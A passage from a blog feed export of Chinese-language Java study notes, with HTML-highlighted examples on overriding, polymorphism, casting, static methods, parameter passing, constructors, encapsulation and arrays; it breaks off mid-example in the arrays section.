class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">super</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方法重写">方法重写</h4><p>子类可以重写父类的方法。</p><p>方法重写的特点：</p><ol><li>方法名必须相同</li><li>参数列表必须相同（与方法重载不同）</li><li>修饰符：范围可以扩大，不可以缩小。</li></ol><p>tips：在IDEA里，<code>ctrl+inside</code>快捷键可以快速调用方法重写功能。</p><p>不能重写的方法：</p><ol><li>static 方法；</li><li>private 方法；</li><li>final 常量；</li></ol><p>main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">      b.output(); <span class="comment">//out:B-out</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A（父类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;A-out&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B（子类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span> &#123;<span class="comment">//修饰符范围可以扩大</span></span><br><span class="line">      System.out.println(<span class="string">&quot;B-out&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多态">多态</h3><h4 id="多态的定义">多态的定义</h4><p>同一个行为具有多个不同表现形式或形态的能力。</p><p>比如在现实世界中，猫和狗（子类）都是动物（父类），他们都会吃（父类继承的方法），但是猫吃鱼，狗吃骨头（方法重写）。</p><h4 id="多态存在的三个必要条件">多态存在的三个必要条件</h4><ol><li>继承</li><li>重写</li><li>父类引用指向子类对象<code>Person s2 = new Student();</code></li></ol><p>Demo1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Pet</span> <span class="variable">pet1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">      <span class="type">Pet</span> <span class="variable">pet2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">      pet1.eat();<span class="comment">//Eat:bone</span></span><br><span class="line">      pet2.eat();<span class="comment">//out:Eat fish</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Pet（父类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Eat All&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dog（子类1）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Eat bone&quot;</span>);;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cat（子类2）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Eat fish&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="多态的作用">多态的作用</h4><p>提高了代码的拓展性，使用父类类型作为方法形式参数，传递子类对象给方法，进行方法的调用。</p><p>听起来很难理解，我们来看例子就很容易理解这个意思的。</p><p>依然使用上面例子的三个类<code>Pet</code>、<code>Dog</code>、<code>Cat</code>。</p><p>Demo2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">      <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">      petEat(dog);<span class="comment">//out:Eat bone</span></span><br><span class="line">      petEat(cat);<span class="comment">//out:Eat fish</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">petEat</span><span class="params">(Pet pet)</span>&#123;</span><br><span class="line">      pet.eat();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="多态的-局限">多态的&quot;局限&quot;</h4><p>当某个子类拥有独有的方法的时候，我们多态的写法就无法访问子类独有的方法了。</p><p>我们重写一下<code>Cat</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Eat fish&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">playBall</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Cat is playing Ball&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Pet</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">      cat.eat();<span class="comment">//out:Eat fish</span></span><br><span class="line">      cat.playBall();<span class="comment">//error!这个编译是没法通过的</span></span><br><span class="line">      <span class="comment">//Pet类本身是没有playBall()这个方法的，因此是没法通过编译的。</span></span><br><span class="line">      <span class="comment">//在使用多态时，编译看左边，运行看右边。</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类型转换">类型转换</h4><p><code>instanceof</code>关键词可以用来测试它左边的对象是否是它右边的类的实例，返回 boolean 的数据类型。</p><p>这种比较需要两边存在关系，否则连编译都没法通过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">      System.out.println(object <span class="keyword">instanceof</span> Cat);<span class="comment">//out:true</span></span><br><span class="line">      System.out.println(object <span class="keyword">instanceof</span> Pet);<span class="comment">//out:true</span></span><br><span class="line">      System.out.println(object <span class="keyword">instanceof</span> Object);<span class="comment">//out:true</span></span><br><span class="line">      System.out.println(object <span class="keyword">instanceof</span> Dog);<span class="comment">//out:false</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在之前的学习中，我们知道，基本数据类型之间的转换，低转高可以自动转化，高转低需要强制转化，在多态的类型转化也是如此。</p><p>多态本身是子类向父类向上转换（自动转换）的过程，这个过程是默认的，因此上文提到的“局限”就出现了，所以我们需要一种强制转化的方法来是对象可以调用子类独有的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Pet</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">      <span class="comment">//将cat对象转化为Cat类型，就可以使用playBall()这个属于Cat类的方法了。</span></span><br><span class="line">      ((Cat) cat).playBall();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种强制转化的方法，也可以使得子转父，但是在子转父的时候，我们就会损失子类的方法。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（3）：静态方法与非静态方法、参数传递、构造器、封装</title>
      <link href="/2022/03/11/Java%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9A%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E4%B8%8E%E9%9D%9E%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E6%9E%84%E9%80%A0%E5%99%A8%E3%80%81%E5%B0%81%E8%A3%85/"/>
      <url>/2022/03/11/Java%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9A%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E4%B8%8E%E9%9D%9E%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E6%9E%84%E9%80%A0%E5%99%A8%E3%80%81%E5%B0%81%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="面向对象-一">面向对象（一）</h2><p>**本质：**以类的方式组织代码，以对象的方式封装数据。</p><h3 id="static">static</h3><p><code>static</code>修饰词所修饰实际上是类的方法或属性，而无<code>static</code>关键词修饰的是在实例化类后，即对象出现后才出现的。</p><h4 id="静态方法-非静态方法">静态方法   \ 非静态方法</h4><p>非静态方法的调用需要先实例化这个类，再进行调用。</p><p>Demo1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.icewindy.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Demo2</span> <span class="variable">demo2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo2</span>();</span><br><span class="line">demo2.out1();<span class="comment">//非静态方法的调用1</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Demo2</span>().out1();<span class="comment">//非静态方法的调用2</span></span><br><span class="line">Demo2.out2();<span class="comment">//这是静态方法的调用</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demo2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.icewindy.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">out1</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;这是非静态方法调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">out2</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;这是静态方法的调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><p>在同一个类中，静态方法不可以直接调用非静态方法，需要先实例化类，非静态方法可以直接互相调用。这是因为静态方法是与类一起加载的，而非静态方法是在类实例化之后才存在的。</p><h3 id="参数传递">参数传递</h3><p>我们先来看一下值传递和引用传递的定义；</p><p>**值传递(pass by value)：**在调用函数时，将实际参数复制一份传递到函数中，这样在函数中对参数进行修改，就不会影响到原来的实际参数。</p><p>**引用传递(pass by reference)：**在调用函数时，将实际参数的地址直接传递到函数中。这样在函数中对参数进行的修改，就会影响到实际参数。</p><p>在Java中，所有的传递都是值传递。如果参数是基本类型，传递的是基本类型的字面量值的拷贝。如果参数是引用类型，传递的是该参量所引用的对象在堆中地址值的拷贝。</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">      System.out.println(a);<span class="comment">//out:1</span></span><br><span class="line">      test.change(a);</span><br><span class="line">      System.out.println(a);<span class="comment">//out:1</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">      a = <span class="number">10</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看第二个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">      System.out.println(person.name);<span class="comment">//out:null</span></span><br><span class="line">      test.change(person);</span><br><span class="line">      System.out.println(person.name);<span class="comment">//out:IceWindy</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(Person person)</span>&#123;</span><br><span class="line">      person.name = <span class="string">&quot;IceWindy&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">   String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造器">构造器</h3><p>类中的构造器也称为构造方法，是在进行创建对象的时候必须调用的。</p><p>构造器有两个特点：</p><ol><li>必须与类的名字相同。</li><li>必须没有返回值，也不可以写<code>void</code>。</li></ol><p>构造器的作用：</p><ol><li>使用<code>new</code>关键词，实际上是在调用构造器。</li><li>一般用于初始化值。</li></ol><p>tip:在IDEA里使用alt+insert，可以快速生成构造器。</p><p>例子：</p><p>main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">classDemo</span> <span class="variable">demo1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">classDemo</span>();<span class="comment">//调用的是无参构造</span></span><br><span class="line">      System.out.println(demo1.str);<span class="comment">//out:null</span></span><br><span class="line">      <span class="type">classDemo</span> <span class="variable">demo2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">classDemo</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">//调用的是有参构造</span></span><br><span class="line">      System.out.println(demo2.str);<span class="comment">//out:hello world</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>class:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">classDemo</span> &#123;</span><br><span class="line">   String str;</span><br><span class="line">   <span class="comment">//无参构造：若无有参构造，无参构造可以隐式</span></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">classDemo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">   <span class="comment">//有参构造：一旦定义了有参构造，无参构造就必须显示定义</span></span><br><span class="line">   <span class="keyword">public</span>  <span class="title function_">classDemo</span><span class="params">(String aStr)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.str = aStr;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="封装">封装</h3><p>通常的，我们会让类的内部数据操作细节自己完成，不允许外部干涉，仅留有少量的方法给外部使用。</p><p>这时，我们会使用<code>private</code>关键词对对象的属性进行隐藏，仅留下<code>public</code>关键词的方法可以对属性进行操作和查看。</p><p>封装之后有什么好处呢：</p><ol><li>提高了程序的安全性，保护数据</li><li>隐藏了代码的实现细节</li><li>统一了接口</li><li>增强了可维护性</li></ol><p>例子：</p><p>main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">student</span> <span class="variable">Student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">student</span>();</span><br><span class="line">      Student1.setName(<span class="string">&quot;XiaoMing&quot;</span>);</span><br><span class="line">      Student1.setGrade(<span class="number">100</span>);</span><br><span class="line">       </span><br><span class="line">      System.out.println(Student1.getName()+<span class="string">&quot; &quot;</span>+Student1.getGrade());<span class="comment">//out:XiaoMing 100</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>student:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.icewindy.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">student</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">double</span> grade;</span><br><span class="line">    </span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getGrade</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> grade;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGrade</span><span class="params">(<span class="type">double</span> grade)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.grade = grade;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（2）：数组、三元运算符</title>
      <link href="/2022/03/09/Java%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9A%E6%95%B0%E7%BB%84%E3%80%81%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
      <url>/2022/03/09/Java%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9A%E6%95%B0%E7%BB%84%E3%80%81%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="数组">数组</h2><h3 id="声明数组变量">声明数组变量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dataType[] array;   <span class="comment">// 首选的方法</span></span><br><span class="line">dataType array[];  <span class="comment">// 效果相同，但不是首选方法</span></span><br></pre></td></tr></table></figure><h3 id="创建数组">创建数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array = <span class="keyword">new</span> <span class="title class_">dataType</span>[arraySize];</span><br></pre></td></tr></table></figure><p>创建数组时做了两件事：</p><ol><li>使用<code>dataType[arraySize]</code>创建了一个数组。</li><li>把新创建的数组的引用赋值给变量 <code>array</code>。</li></ol><p>我们也可以讲声明与创建数组合二为一：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataType[] array = <span class="keyword">new</span> <span class="title class_">dataType</span>[arraySize];</span><br></pre></td></tr></table></figure><p>还可以使用下面方法来创建数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataType[] array = &#123;value0, value1, ..., valuek&#125;; </span><br></pre></td></tr></table></figure><h3 id="数组拷贝">数组拷贝</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] firstArray = &#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] secondArray = firstArray;</span><br><span class="line">secondArray[<span class="number">1</span>] = <span class="number">10</span>;<span class="comment">//此时，firstArray[1]的值也变成了10</span></span><br></pre></td></tr></table></figure><p>这种拷贝方式会将两个变量引用到同一个数组。</p><p>如果我们希望的是将一个数组的所有值拷贝到一个新的数组中去，就要使用<code>Arrays</code>类的<code>copyOf</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] secondArray = Arrays.copy0f(firstArray, firstArray.length);</span><br></pre></td></tr></table></figure><p>第二个参数为新数组的长度，我们通常用此方法来增加数组大小：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] secondArray = Arrays.copy0f(firstArray, <span class="number">2</span> * firstArray.length);</span><br></pre></td></tr></table></figure><p>当新数组长度小于原数组时，则只拷贝前面的值，后面的值会被裁切丢弃。</p><h3 id="数组排序">数组排序</h3><p><code>Arrays</code>类中给我们提供了一种排序的方法–快速排序<code>QuickSort</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">in</span>[<span 